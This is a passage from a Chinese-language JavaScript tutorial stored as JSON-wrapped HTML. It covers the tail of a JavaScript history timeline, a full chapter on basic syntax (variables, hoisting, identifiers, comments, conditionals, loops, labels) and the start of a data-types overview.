href=\"https://github.com/kripken/emscripten/wiki\">Emscripten</a> 项目，目标就是提供一个跨语言的编译器，能够将 LLVM 的位代码（bitcode）转为 JavaScript 代码，在浏览器中运行。因为大部分 LLVM 位代码都是从 C / C++ 语言生成的，这意味着 C / C++ 将可以在浏览器中运行。此外，Mozilla 旗下还有 <a href=\"http://mbebenita.github.io/LLJS/\">LLJS</a> （将 JavaScript 转为 C 代码）项目和 <a href=\"https://github.com/RiverTrail/RiverTrail/wiki\">River Trail</a> （一个用于多核心处理器的 ECMAScript 扩展）项目。目前，可以被编译成 JavaScript 的<a href=\"https://github.com/jashkenas/coffee-script/wiki/List-of-languages-that-compile-to-JS\">语言列表</a>，共有将近40种语言。</p>\n<p>2013年，Mozilla 基金会发布手机操作系统 Firefox OS，该操作系统的整个用户界面都使用 JavaScript。</p>\n<p>2013年，ECMA 正式推出 JSON 的<a href=\"http://www.ecma-international.org/publications/standards/Ecma-404.htm\">国际标准</a>，这意味着 JSON 格式已经变得与 XML 格式一样重要和正式了。</p>\n<p>2013年5月，Facebook 发布 UI 框架库 React，引入了新的 JSX 语法，使得 UI 层可以用组件开发，同时引入了网页应用是状态机的概念。</p>\n<p>2014年，微软推出 JavaScript 的 Windows 库 WinJS，标志微软公司全面支持 JavaScript 与 Windows 操作系统的融合。</p>\n<p>2014年11月，由于对 Joyent 公司垄断 Node 项目、以及该项目进展缓慢的不满，一部分核心开发者离开了 Node.js，创造了 io.js 项目，这是一个更开放、更新更频繁的 Node.js 版本，很短时间内就发布到了2.0版。三个月后，Joyent 公司宣布放弃对 Node 项目的控制，将其转交给新成立的开放性质的 Node 基金会。随后，io.js 项目宣布回归 Node，两个版本将合并。</p>\n<p>2015年3月，Facebook 公司发布了 React Native 项目，将 React 框架移植到了手机端，可以用来开发手机 App。它会将 JavaScript 代码转为 iOS 平台的 Objective-C 代码，或者 Android 平台的 Java 代码，从而为 JavaScript 语言开发高性能的原生 App 打开了一条道路。</p>\n<p>2015年4月，Angular 框架宣布，2.0 版将基于微软公司的TypeScript语言开发，这等于为 JavaScript 语言引入了强类型。</p>\n<p>2015年5月，Node 模块管理器 NPM 超越 CPAN，标志着 JavaScript 成为世界上软件模块最多的语言。</p>\n<p>2015年5月，Google 公司的 Polymer 框架发布1.0版。该项目的目标是生产环境可以使用 WebComponent 组件，如果能够达到目标，Web 开发将进入一个全新的以组件为开发基础的阶段。</p>\n<p>2015年6月，ECMA 标准化组织正式批准了 ECMAScript 6 语言标准，定名为《ECMAScript 2015 标准》。JavaScript语言正式进入了下一个阶段，成为一种企业级的、开发大规模应用的语言。这个标准从提出到批准，历时10年，而 JavaScript 语言从诞生至今也已经20年了。</p>\n<p>2015年6月，Mozilla 在 asm.js 的基础上发布 WebAssembly 项目。这是一种 JavaScript 引擎的中间码格式，全部都是二进制，类似于 Java 的字节码，有利于移动设备加载 JavaScript 脚本，执行速度提高了 20+ 倍。这意味着将来的软件，会发布 JavaScript 二进制包。</p>\n<p>2016年6月，《ECMAScript 2016 标准》发布。与前一年发布的版本相比，它只增加了两个较小的特性。</p>\n<p>2017年6月，《ECMAScript 2017 标准》发布，正式引入了 async 函数，使得异步操作的写法出现了根本的变化。</p>\n<p>2017年11月，所有主流浏览器全部支持 WebAssembly，这意味着任何语言都可以编译成 JavaScript，在浏览器运行。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://oreilly.com/javascript/radarreports/past-present-future-javascript.csp\">The Past, Present, and Future of JavaScript</a></li>\n<li>John Dalziel, <a href=\"http://creativejs.com/2013/06/the-race-for-speed-part-4-the-future-for-javascript/\">The race for speed part 4: The future for JavaScript</a></li>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2013/06/basic-javascript.html\">Basic JavaScript for the impatient programmer</a></li>\n<li>resin.io, <a href=\"http://resin.io/happy-18th-birthday-javascript/\">Happy 18th Birthday JavaScript! A look at an unlikely past and bright future</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"入门篇","link":"javascript:void(0)"},{"title":"基本语法","link":"/basic/grammar.html"}],"content":"\n        <h1>\n            <a href='#JavaScript-的基本语法' class='header-anchor'>#</a>\n            <span>JavaScript 的基本语法</span>\n        </h1>\n    \n        <h2>\n            <a href='#语句' class='header-anchor'>#</a>\n            <span>语句</span>\n        </h2>\n    <p>JavaScript 程序的执行单位为行（line），也就是一行一行地执行。一般情况下，每一行就是一个语句。</p>\n<p>语句（statement）是为了完成某种任务而进行的操作，比如下面就是一行赋值语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1 + 3;</code></pre><p>这条语句先用<code>var</code>命令，声明了变量<code>a</code>，然后将<code>1 + 3</code>的运算结果赋值给变量<code>a</code>。</p>\n<p><code>1 + 3</code>叫做表达式（expression），指一个为了得到返回值的计算式。语句和表达式的区别在于，前者主要为了进行某种操作，一般情况下不需要返回值；后者则是为了得到返回值，一定会返回一个值。凡是 JavaScript 语言中预期为值的地方，都可以使用表达式。比如，赋值语句的等号右边，预期是一个值，因此可以放置各种表达式。</p>\n<p>语句以分号结尾，一个分号就表示一个语句结束。多个语句可以写在一行内。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1 + 3 ; var b = &#039;abc&#039;;</code></pre><p>分号前面可以没有任何内容，JavaScript引擎将其视为空语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>;;;</code></pre><p>上面的代码就表示3个空语句。</p>\n<p>表达式不需要分号结尾。一旦在表达式后面添加分号，则 JavaScript 引擎就将表达式视为语句，这样会产生一些没有任何意义的语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>1 + 3;\n&#039;abc&#039;;</code></pre><p>上面两行语句只是单纯地产生一个值，并没有任何实际的意义。</p>\n\n        <h2>\n            <a href='#变量' class='header-anchor'>#</a>\n            <span>变量</span>\n        </h2>\n    \n        <h3>\n            <a href='#概念' class='header-anchor'>#</a>\n            <span>概念</span>\n        </h3>\n    <p>变量是对“值”的具名引用。变量就是为“值”起名，然后引用这个名字，就等同于引用这个值。变量的名字就是变量名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;</code></pre><p>上面的代码先声明变量<code>a</code>，然后在变量<code>a</code>与数值1之间建立引用关系，称为将数值1“赋值”给变量<code>a</code>。以后，引用变量名<code>a</code>就会得到数值1。最前面的<code>var</code>，是变量声明命令。它表示通知解释引擎，要创建一个变量<code>a</code>。</p>\n<p>注意，JavaScript 的变量名区分大小写，<code>A</code>和<code>a</code>是两个不同的变量。</p>\n<p>变量的声明和赋值，是分开的两个步骤，上面的代码将它们合在了一起，实际的步骤是下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a;\na = 1;</code></pre><p>如果只是声明变量而没有赋值，则该变量的值是<code>undefined</code>。<code>undefined</code>是一个 JavaScript 关键字，表示“无定义”。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a;\na // undefined</code></pre><p>如果变量赋值的时候，忘了写<code>var</code>命令，这条语句也是有效的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\n// 基本等同\na = 1;</code></pre><p>但是，不写<code>var</code>的做法，不利于表达意图，而且容易不知不觉地创建全局变量，所以建议总是使用<code>var</code>命令声明变量。</p>\n<p>如果一个变量没有声明就直接使用，JavaScript 会报错，告诉你变量未定义。</p>\n<pre class=\"prettyprint language-javascript\"><code>x\n// ReferenceError: x is not defined</code></pre><p>上面代码直接使用变量<code>x</code>，系统就报错，告诉你变量<code>x</code>没有声明。</p>\n<p>可以在同一条<code>var</code>命令中声明多个变量。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a, b;</code></pre><p>JavaScript 是一种动态类型语言，也就是说，变量的类型没有限制，变量可以随时更改类型。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a = 1;\na = &#039;hello&#039;;</code></pre><p>上面代码中，变量<code>a</code>起先被赋值为一个数值，后来又被重新赋值为一个字符串。第二次赋值的时候，因为变量<code>a</code>已经存在，所以不需要使用<code>var</code>命令。</p>\n<p>如果使用<code>var</code>重新声明一个已经存在的变量，是无效的。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar x;\nx // 1</code></pre><p>上面代码中，变量<code>x</code>声明了两次，第二次声明是无效的。</p>\n<p>但是，如果第二次声明的时候还进行了赋值，则会覆盖掉前面的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar x = 2;\n\n// 等同于\n\nvar x = 1;\nvar x;\nx = 2;</code></pre>\n        <h3>\n            <a href='#变量提升' class='header-anchor'>#</a>\n            <span>变量提升</span>\n        </h3>\n    <p>JavaScript 引擎的工作方式是，先解析代码，获取所有被声明的变量，然后再一行一行地运行。这造成的结果，就是所有的变量的声明语句，都会被提升到代码的头部，这就叫做变量提升（hoisting）。</p>\n<pre class=\"prettyprint language-javascript\"><code>console.log(a);\nvar a = 1;</code></pre><p>上面代码首先使用<code>console.log</code>方法，在控制台（console）显示变量<code>a</code>的值。这时变量<code>a</code>还没有声明和赋值，所以这是一种错误的做法，但是实际上不会报错。因为存在变量提升，真正运行的是下面的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>var a;\nconsole.log(a);\na = 1;</code></pre><p>最后的结果是显示<code>undefined</code>，表示变量<code>a</code>已声明，但还未赋值。</p>\n\n        <h2>\n            <a href='#标识符' class='header-anchor'>#</a>\n            <span>标识符</span>\n        </h2>\n    <p>标识符（identifier）指的是用来识别各种值的合法名称。最常见的标识符就是变量名，以及后面要提到的函数名。JavaScript 语言的标识符对大小写敏感，所以<code>a</code>和<code>A</code>是两个不同的标识符。</p>\n<p>标识符有一套命名规则，不符合规则的就是非法标识符。JavaScript 引擎遇到非法标识符，就会报错。</p>\n<p>简单说，标识符命名规则如下。</p>\n<ul>\n<li>第一个字符，可以是任意 Unicode 字母（包括英文字母和其他语言的字母），以及美元符号（<code>$</code>）和下划线（<code>_</code>）。</li>\n<li>第二个字符及后面的字符，除了 Unicode 字母、美元符号和下划线，还可以用数字<code>0-9</code>。</li>\n</ul>\n<p>下面这些都是合法的标识符。</p>\n<pre class=\"prettyprint language-javascript\"><code>arg0\n_tmp\n$elem\nπ</code></pre><p>下面这些则是不合法的标识符。</p>\n<pre class=\"prettyprint language-javascript\"><code>1a  // 第一个字符不能是数字\n23  // 同上\n***  // 标识符不能包含星号\na+b  // 标识符不能包含加号\n-d  // 标识符不能包含减号或连词线</code></pre><p>中文是合法的标识符，可以用作变量名。</p>\n<pre class=\"prettyprint language-javascript\"><code>var 临时变量 = 1;</code></pre><blockquote>\n<p>JavaScript有一些保留字，不能用作标识符：arguments、break、case、catch、class、const、continue、debugger、default、delete、do、else、enum、eval、export、extends、false、finally、for、function、if、implements、import、in、instanceof、interface、let、new、null、package、private、protected、public、return、static、super、switch、this、throw、true、try、typeof、var、void、while、with、yield。</p>\n</blockquote>\n\n        <h2>\n            <a href='#注释' class='header-anchor'>#</a>\n            <span>注释</span>\n        </h2>\n    <p>源码中被 JavaScript 引擎忽略的部分就叫做注释，它的作用是对代码进行解释。Javascript 提供两种注释的写法：一种是单行注释，用<code>//</code>起头；另一种是多行注释，放在<code>/*</code>和<code>*/</code>之间。</p>\n<pre class=\"prettyprint language-javascript\"><code>// 这是单行注释\n\n/*\n 这是\n 多行\n 注释\n*/</code></pre><p>此外，由于历史上 JavaScript 可以兼容 HTML 代码的注释，所以<code>&lt;!--</code>和<code>--&gt;</code>也被视为合法的单行注释。</p>\n<pre class=\"prettyprint language-javascript\"><code>x = 1; &lt;!-- x = 2;\n--&gt; x = 3;</code></pre><p>上面代码中，只有<code>x = 1</code>会执行，其他的部分都被注释掉了。</p>\n<p>需要注意的是，<code>--&gt;</code>只有在行首，才会被当成单行注释，否则会当作正常的运算。</p>\n<pre class=\"prettyprint language-javascript\"><code>function countdown(n) {\n  while (n --&gt; 0) console.log(n);\n}\ncountdown(3)\n// 2\n// 1\n// 0</code></pre><p>上面代码中，<code>n --&gt; 0</code>实际上会当作<code>n-- &gt; 0</code>，因此输出2、1、0。</p>\n\n        <h2>\n            <a href='#区块' class='header-anchor'>#</a>\n            <span>区块</span>\n        </h2>\n    <p>JavaScript 使用大括号，将多个相关的语句组合在一起，称为“区块”（block）。</p>\n<p>对于<code>var</code>命令来说，JavaScript 的区块不构成单独的作用域（scope）。</p>\n<pre class=\"prettyprint language-javascript\"><code>{\n  var a = 1;\n}\n\na // 1</code></pre><p>上面代码在区块内部，使用<code>var</code>命令声明并赋值了变量<code>a</code>，然后在区块外部，变量<code>a</code>依然有效，区块对于<code>var</code>命令不构成单独的作用域，与不使用区块的情况没有任何区别。在 JavaScript 语言中，单独使用区块并不常见，区块往往用来构成其他更复杂的语法结构，比如<code>for</code>、<code>if</code>、<code>while</code>、<code>function</code>等。</p>\n\n        <h2>\n            <a href='#条件语句' class='header-anchor'>#</a>\n            <span>条件语句</span>\n        </h2>\n    <p>JavaScript 提供<code>if</code>结构和<code>switch</code>结构，完成条件判断，即只有满足预设的条件，才会执行相应的语句。</p>\n\n        <h3>\n            <a href='#if-结构' class='header-anchor'>#</a>\n            <span>if 结构</span>\n        </h3>\n    <p><code>if</code>结构先判断一个表达式的布尔值，然后根据布尔值的真伪，执行不同的语句。所谓布尔值，指的是 JavaScript 的两个特殊值，<code>true</code>表示真，<code>false</code>表示<code>伪</code>。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (布尔值)\n  语句;\n\n// 或者\nif (布尔值) 语句;</code></pre><p>上面是<code>if</code>结构的基本形式。需要注意的是，“布尔值”往往由一个条件表达式产生的，必须放在圆括号中，表示对表达式求值。如果表达式的求值结果为<code>true</code>，就执行紧跟在后面的语句；如果结果为<code>false</code>，则跳过紧跟在后面的语句。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 3)\n  m = m + 1;</code></pre><p>上面代码表示，只有在<code>m</code>等于3时，才会将其值加上1。</p>\n<p>这种写法要求条件表达式后面只能有一个语句。如果想执行多个语句，必须在<code>if</code>的条件判断之后，加上大括号，表示代码块（多个语句合并成一个语句）。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 3) {\n  m += 1;\n}</code></pre><p>建议总是在<code>if</code>语句中使用大括号，因为这样方便插入语句。</p>\n<p>注意，<code>if</code>后面的表达式之中，不要混淆赋值表达式（<code>=</code>）、严格相等运算符（<code>===</code>）和相等运算符（<code>==</code>）。尤其是赋值表达式不具有比较作用。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\nvar y = 2;\nif (x = y) {\n  console.log(x);\n}\n// &quot;2&quot;</code></pre><p>上面代码的原意是，当<code>x</code>等于<code>y</code>的时候，才执行相关语句。但是，不小心将严格相等运算符写成赋值表达式，结果变成了将<code>y</code>赋值给变量<code>x</code>，再判断变量<code>x</code>的值（等于2）的布尔值（结果为<code>true</code>）。</p>\n<p>这种错误可以正常生成一个布尔值，因而不会报错。为了避免这种情况，有些开发者习惯将常量写在运算符的左边，这样的话，一旦不小心将相等运算符写成赋值运算符，就会报错，因为常量不能被赋值。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (x = 2) { // 不报错\nif (2 = x) { // 报错</code></pre><p>至于为什么优先采用“严格相等运算符”（<code>===</code>），而不是“相等运算符”（<code>==</code>），请参考《运算符》章节。</p>\n\n        <h3>\n            <a href='#if...else-结构' class='header-anchor'>#</a>\n            <span>if...else 结构</span>\n        </h3>\n    <p><code>if</code>代码块后面，还可以跟一个<code>else</code>代码块，表示不满足条件时，所要执行的代码。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 3) {\n  // 满足条件时，执行的语句\n} else {\n  // 不满足条件时，执行的语句\n}</code></pre><p>上面代码判断变量<code>m</code>是否等于3，如果等于就执行<code>if</code>代码块，否则执行<code>else</code>代码块。</p>\n<p>对同一个变量进行多次判断时，多个<code>if...else</code>语句可以连写在一起。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m === 0) {\n  // ...\n} else if (m === 1) {\n  // ...\n} else if (m === 2) {\n  // ...\n} else {\n  // ...\n}</code></pre><p><code>else</code>代码块总是与离自己最近的那个<code>if</code>语句配对。</p>\n<pre class=\"prettyprint language-javascript\"><code>var m = 1;\nvar n = 2;\n\nif (m !== 1)\nif (n === 2) console.log(&#039;hello&#039;);\nelse console.log(&#039;world&#039;);</code></pre><p>上面代码不会有任何输出，<code>else</code>代码块不会得到执行，因为它跟着的是最近的那个<code>if</code>语句，相当于下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m !== 1) {\n  if (n === 2) {\n    console.log(&#039;hello&#039;);    \n  } else {\n    console.log(&#039;world&#039;);\n  }\n}</code></pre><p>如果想让<code>else</code>代码块跟随最上面的那个<code>if</code>语句，就要改变大括号的位置。</p>\n<pre class=\"prettyprint language-javascript\"><code>if (m !== 1) {\n  if (n === 2) {\n    console.log(&#039;hello&#039;);    \n  }\n} else {\n  console.log(&#039;world&#039;);\n}\n// world</code></pre>\n        <h3>\n            <a href='#switch-结构' class='header-anchor'>#</a>\n            <span>switch 结构</span>\n        </h3>\n    <p>多个<code>if...else</code>连在一起使用的时候，可以转为使用更方便的<code>switch</code>结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>switch (fruit) {\n  case &quot;banana&quot;:\n    // ...\n    break;\n  case &quot;apple&quot;:\n    // ...\n    break;\n  default:\n    // ...\n}</code></pre><p>上面代码根据变量<code>fruit</code>的值，选择执行相应的<code>case</code>。如果所有<code>case</code>都不符合，则执行最后的<code>default</code>部分。需要注意的是，每个<code>case</code>代码块内部的<code>break</code>语句不能少，否则会接下去执行下一个<code>case</code>代码块，而不是跳出<code>switch</code>结构。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n\nswitch (x) {\n  case 1:\n    console.log(&#039;x 等于1&#039;);\n  case 2:\n    console.log(&#039;x 等于2&#039;);\n  default:\n    console.log(&#039;x 等于其他值&#039;);\n}\n// x等于1\n// x等于2\n// x等于其他值</code></pre><p>上面代码中，<code>case</code>代码块之中没有<code>break</code>语句，导致不会跳出<code>switch</code>结构，而会一直执行下去。正确的写法是像下面这样。</p>\n<pre class=\"prettyprint language-javascript\"><code>switch (x) {\n  case 1:\n    console.log(&#039;x 等于1&#039;);\n    break;\n  case 2:\n    console.log(&#039;x 等于2&#039;);\n    break;\n  default:\n    console.log(&#039;x 等于其他值&#039;);\n}</code></pre><p><code>switch</code>语句部分和<code>case</code>语句部分，都可以使用表达式。</p>\n<pre class=\"prettyprint language-javascript\"><code>switch (1 + 3) {\n  case 2 + 2:\n    f();\n    break;\n  default:\n    neverHappens();\n}</code></pre><p>上面代码的<code>default</code>部分，是永远不会执行到的。</p>\n<p>需要注意的是，<code>switch</code>语句后面的表达式，与<code>case</code>语句后面的表示式比较运行结果时，采用的是严格相等运算符（<code>===</code>），而不是相等运算符（<code>==</code>），这意味着比较时不会发生类型转换。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 1;\n\nswitch (x) {\n  case true:\n    console.log(&#039;x 发生类型转换&#039;);\n  default:\n    console.log(&#039;x 没有发生类型转换&#039;);\n}\n// x 没有发生类型转换</code></pre><p>上面代码中，由于变量<code>x</code>没有发生类型转换，所以不会执行<code>case true</code>的情况。这表明，<code>switch</code>语句内部采用的是“严格相等运算符”，详细解释请参考《运算符》一节。</p>\n\n        <h3>\n            <a href='#三元运算符-?:' class='header-anchor'>#</a>\n            <span>三元运算符 ?:</span>\n        </h3>\n    <p>JavaScript还有一个三元运算符（即该运算符需要三个运算子）<code>?:</code>，也可以用于逻辑判断。</p>\n<pre class=\"prettyprint language-javascript\"><code>(条件) ? 表达式1 : 表达式2</code></pre><p>上面代码中，如果“条件”为<code>true</code>，则返回“表达式1”的值，否则返回“表达式2”的值。</p>\n<pre class=\"prettyprint language-javascript\"><code>var even = (n % 2 === 0) ? true : false;</code></pre><p>上面代码中，如果<code>n</code>可以被2整除，则<code>even</code>等于<code>true</code>，否则等于<code>false</code>。它等同于下面的形式。</p>\n<pre class=\"prettyprint language-javascript\"><code>var even;\nif (n % 2 === 0) {\n  even = true;\n} else {\n  even = false;\n}</code></pre><p>这个三元运算符可以被视为<code>if...else...</code>的简写形式，因此可以用于多种场合。</p>\n<pre class=\"prettyprint language-javascript\"><code>var myVar;\nconsole.log(\n  myVar ?\n  &#039;myVar has a value&#039; :\n  &#039;myVar does not have a value&#039;\n)\n// myVar does not have a value</code></pre><p>上面代码利用三元运算符，输出相应的提示。</p>\n<pre class=\"prettyprint language-javascript\"><code>var msg = &#039;数字&#039; + n + &#039;是&#039; + (n % 2 === 0 ? &#039;偶数&#039; : &#039;奇数&#039;);</code></pre><p>上面代码利用三元运算符，在字符串之中插入不同的值。</p>\n\n        <h2>\n            <a href='#循环语句' class='header-anchor'>#</a>\n            <span>循环语句</span>\n        </h2>\n    <p>循环语句用于重复执行某个操作，它有多种形式。</p>\n\n        <h3>\n            <a href='#while-循环' class='header-anchor'>#</a>\n            <span>while 循环</span>\n        </h3>\n    <p><code>While</code>语句包括一个循环条件和一段代码块，只要条件为真，就不断循环执行代码块。</p>\n<pre class=\"prettyprint language-javascript\"><code>while (条件)\n  语句;\n\n// 或者\nwhile (条件) 语句;</code></pre><p><code>while</code>语句的循环条件是一个表达式，必须放在圆括号中。代码块部分，如果只有一条语句，可以省略大括号，否则就必须加上大括号。</p>\n<pre class=\"prettyprint language-javascript\"><code>while (条件) {\n  语句;\n}</code></pre><p>下面是<code>while</code>语句的一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = 0;\n\nwhile (i &lt; 100) {\n  console.log(&#039;i 当前为：&#039; + i);\n  i = i + 1;\n}</code></pre><p>上面的代码将循环100次，直到<code>i</code>等于100为止。</p>\n<p>下面的例子是一个无限循环，因为循环条件总是为真。</p>\n<pre class=\"prettyprint language-javascript\"><code>while (true) {\n  console.log(&#039;Hello, world&#039;);\n}</code></pre>\n        <h3>\n            <a href='#for-循环' class='header-anchor'>#</a>\n            <span>for 循环</span>\n        </h3>\n    <p><code>for</code>语句是循环命令的另一种形式，可以指定循环的起点、终点和终止条件。它的格式如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (初始化表达式; 条件; 递增表达式)\n  语句\n\n// 或者\n\nfor (初始化表达式; 条件; 递增表达式) {\n  语句\n}</code></pre><p><code>for</code>语句后面的括号里面，有三个表达式。</p>\n<ul>\n<li>初始化表达式（initialize）：确定循环变量的初始值，只在循环开始时执行一次。</li>\n<li>条件表达式（test）：每轮循环开始时，都要执行这个条件表达式，只有值为真，才继续进行循环。</li>\n<li>递增表达式（increment）：每轮循环的最后一个操作，通常用来递增循环变量。</li>\n</ul>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nfor (var i = 0; i &lt; x; i++) {\n  console.log(i);\n}\n// 0\n// 1\n// 2</code></pre><p>上面代码中，初始化表达式是<code>var i = 0</code>，即初始化一个变量<code>i</code>；测试表达式是<code>i &lt; x</code>，即只要<code>i</code>小于<code>x</code>，就会执行循环；递增表达式是<code>i++</code>，即每次循环结束后，<code>i</code>增大1。</p>\n<p>所有<code>for</code>循环，都可以改写成<code>while</code>循环。上面的例子改为<code>while</code>循环，代码如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nvar i = 0;\n\nwhile (i &lt; x) {\n  console.log(i);\n  i++;\n}</code></pre><p><code>for</code>语句的三个部分（initialize、test、increment），可以省略任何一个，也可以全部省略。</p>\n<pre class=\"prettyprint language-javascript\"><code>for ( ; ; ){\n  console.log(&#039;Hello World&#039;);\n}</code></pre><p>上面代码省略了<code>for</code>语句表达式的三个部分，结果就导致了一个无限循环。</p>\n\n        <h3>\n            <a href='#do...while-循环' class='header-anchor'>#</a>\n            <span>do...while 循环</span>\n        </h3>\n    <p><code>do...while</code>循环与<code>while</code>循环类似，唯一的区别就是先运行一次循环体，然后判断循环条件。</p>\n<pre class=\"prettyprint language-javascript\"><code>do\n  语句\nwhile (条件);\n\n// 或者\ndo {\n  语句\n} while (条件);</code></pre><p>不管条件是否为真，<code>do...while</code>循环至少运行一次，这是这种结构最大的特点。另外，<code>while</code>语句后面的分号注意不要省略。</p>\n<p>下面是一个例子。</p>\n<pre class=\"prettyprint language-javascript\"><code>var x = 3;\nvar i = 0;\n\ndo {\n  console.log(i);\n  i++;\n} while(i &lt; x);</code></pre>\n        <h3>\n            <a href='#break-语句和-continue-语句' class='header-anchor'>#</a>\n            <span>break 语句和 continue 语句</span>\n        </h3>\n    <p><code>break</code>语句和<code>continue</code>语句都具有跳转作用，可以让代码不按既有的顺序执行。</p>\n<p><code>break</code>语句用于跳出代码块或循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = 0;\n\nwhile(i &lt; 100) {\n  console.log(&#039;i 当前为：&#039; + i);\n  i++;\n  if (i === 10) break;\n}</code></pre><p>上面代码只会执行10次循环，一旦<code>i</code>等于10，就会跳出循环。</p>\n<p><code>for</code>循环也可以使用<code>break</code>语句跳出循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>for (var i = 0; i &lt; 5; i++) {\n  console.log(i);\n  if (i === 3)\n    break;\n}\n// 0\n// 1\n// 2\n// 3</code></pre><p>上面代码执行到<code>i</code>等于3，就会跳出循环。</p>\n<p><code>continue</code>语句用于立即终止本轮循环，返回循环结构的头部，开始下一轮循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>var i = 0;\n\nwhile (i &lt; 100){\n  i++;\n  if (i % 2 === 0) continue;\n  console.log(&#039;i 当前为：&#039; + i);\n}</code></pre><p>上面代码只有在<code>i</code>为奇数时，才会输出<code>i</code>的值。如果<code>i</code>为偶数，则直接进入下一轮循环。</p>\n<p>如果存在多重循环，不带参数的<code>break</code>语句和<code>continue</code>语句都只针对最内层循环。</p>\n\n        <h3>\n            <a href='#标签（label）' class='header-anchor'>#</a>\n            <span>标签（label）</span>\n        </h3>\n    <p>JavaScript 语言允许，语句的前面有标签（label），相当于定位符，用于跳转到程序的任意位置，标签的格式如下。</p>\n<pre class=\"prettyprint language-javascript\"><code>label:\n  语句</code></pre><p>标签可以是任意的标识符，但不能是保留字，语句部分可以是任意语句。</p>\n<p>标签通常与<code>break</code>语句和<code>continue</code>语句配合使用，跳出特定的循环。</p>\n<pre class=\"prettyprint language-javascript\"><code>top:\n  for (var i = 0; i &lt; 3; i++){\n    for (var j = 0; j &lt; 3; j++){\n      if (i === 1 &amp;&amp; j === 1) break top;\n      console.log(&#039;i=&#039; + i + &#039;, j=&#039; + j);\n    }\n  }\n// i=0, j=0\n// i=0, j=1\n// i=0, j=2\n// i=1, j=0</code></pre><p>上面代码为一个双重循环区块，<code>break</code>命令后面加上了<code>top</code>标签（注意，<code>top</code>不用加引号），满足条件时，直接跳出双层循环。如果<code>break</code>语句后面不使用标签，则只能跳出内层循环，进入下一次的外层循环。</p>\n<p>标签也可以用于跳出代码块。</p>\n<pre class=\"prettyprint language-javascript\"><code>foo: {\n  console.log(1);\n  break foo;\n  console.log(&#039;本行不会输出&#039;);\n}\nconsole.log(2);\n// 1\n// 2</code></pre><p>上面代码执行到<code>break foo</code>，就会跳出区块。</p>\n<p><code>continue</code>语句也可以与标签配合使用。</p>\n<pre class=\"prettyprint language-javascript\"><code>top:\n  for (var i = 0; i &lt; 3; i++){\n    for (var j = 0; j &lt; 3; j++){\n      if (i === 1 &amp;&amp; j === 1) continue top;\n      console.log(&#039;i=&#039; + i + &#039;, j=&#039; + j);\n    }\n  }\n// i=0, j=0\n// i=0, j=1\n// i=0, j=2\n// i=1, j=0\n// i=2, j=0\n// i=2, j=1\n// i=2, j=2</code></pre><p>上面代码中，<code>continue</code>命令后面有一个标签名，满足条件时，会跳过当前循环，直接进入下一轮外层循环。如果<code>continue</code>语句后面不使用标签，则只能进入下一轮的内层循环。</p>\n\n        <h2>\n            <a href='#参考链接' class='header-anchor'>#</a>\n            <span>参考链接</span>\n        </h2>\n    <ul>\n<li>Axel Rauschmayer, <a href=\"http://www.2ality.com/2011/10/javascript-overview.html\">A quick overview of JavaScript</a></li>\n</ul>\n"},{"context":[{"title":"教程","link":"javascript:void(0)"},{"title":"数据类型","link":"javascript:void(0)"},{"title":"概述","link":"/types/general.html"}],"content":"\n        <h1>\n            <a href='#数据类型概述' class='header-anchor'>#</a>\n            <span>数据类型概述</span>\n        </h1>\n    \n        <h2>\n            <a href='#简介' class='header-anchor'>#</a>\n            <span>简介</span>\n        </h2>\n    <p>JavaScript 语言的每一个值，都属于某一种数据类型。JavaScript 的数据类型，共有六种。（ES6 又新增了第七种 Symbol 类型的值，本教程不涉及。）</p>\n<ul>\n<li>数值（number）：整数和小数（比如<code>1</code>和<code>3.14</code>）</li>\n<li>字符串（string）：文本（比如<code>Hello World</code>）。</li>\n<li>布尔值（boolean）：表示真伪的两个特殊值，即<code>true</code>（真）和<code>false</code>（假）</li>\n<li><code>undefined</code>：表示“未定义”或不存在，即由于目前没有定义，所以此处暂时没有任何值</li>\n<li><code>null</code>：表示空值，即此处的值为空。</li>\n<li>对象（object）：各种值组成的集合。</li>\n</ul>\n<p>通常，数值、字符串、布尔值这三种类型，合称为原始类型（primitive type）的值，即它们是最基本的数据类型，不能再细分了。对象则称为合成类型（complex 